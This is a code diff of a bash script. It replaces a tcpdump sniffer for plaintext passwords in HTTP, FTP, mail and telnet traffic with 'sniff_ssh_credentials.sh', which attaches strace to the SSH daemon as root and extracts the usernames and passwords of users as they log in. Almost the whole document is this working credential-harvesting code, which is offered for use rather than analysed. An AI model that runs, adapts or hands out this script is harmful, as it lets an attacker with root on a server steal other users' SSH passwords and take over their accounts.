@@ -2,24 +2,27 @@
 #
 # Author:       Riccardo Mollo (riccardomollo84@gmail.com)
 #
-# Name:	        tcpdump_sniff_passwords.sh
+# Name:	        sniff_ssh_credentials.sh
 #
-# Description:  A script that sniffs the traffic on your machine looking for
-#               plaintext credentials (HTTP, FTP, SMTP, IMAP, POP3, TELNET).
+# Description:  A script that sniffs usernames and passwords in plaintext.
+#               You must be root on the server where SSH daemon is running.
+#               The output will be something like:
 #
-# Usage:        ./tcpdump_sniff_passwords.sh
+#               user1
+#               password1
+#               user2
+#               password2
+#               ...
+#
+# Usage:        ./sniff_ssh_credentials.sh
 #
 #
 # --TODO--
+# - improve sed regexp
 # - ???
 #
 #
 ################################################################################
-
-
-# VARIABLES --------------------------------------------------------------------
-
-NIC="eth0"
 
 
 # FUNCTIONS --------------------------------------------------------------------
@@ -38,8 +41,7 @@ if [[ $EUID -ne 0 ]] ; then
 fi
 
 declare -a CMDS=(
-"egrep"
-"tcpdump"
+"strace"
 );
 
 for CMD in ${CMDS[@]} ; do
@@ -49,5 +51,8 @@ done
 
 # MAIN -------------------------------------------------------------------------
 
-tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -lA -i "${NIC}" | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user '
+
+SSHD_PPID=$(ps axf | grep sshd | grep -v grep | grep -v 'sshd:' | awk '{ print $1 }')
+
+strace -f -p $SSHD_PPID 2>&1 | grep --line-buffered -F 'read(6' | grep --line-buffered -E '\\10\\0\\0\\0|\\f\\0\\0\\0' | grep --line-buffered -oP '(?<=, ").*(?=",)' | sed -e 's/\\[[:alnum:]]//g'
 
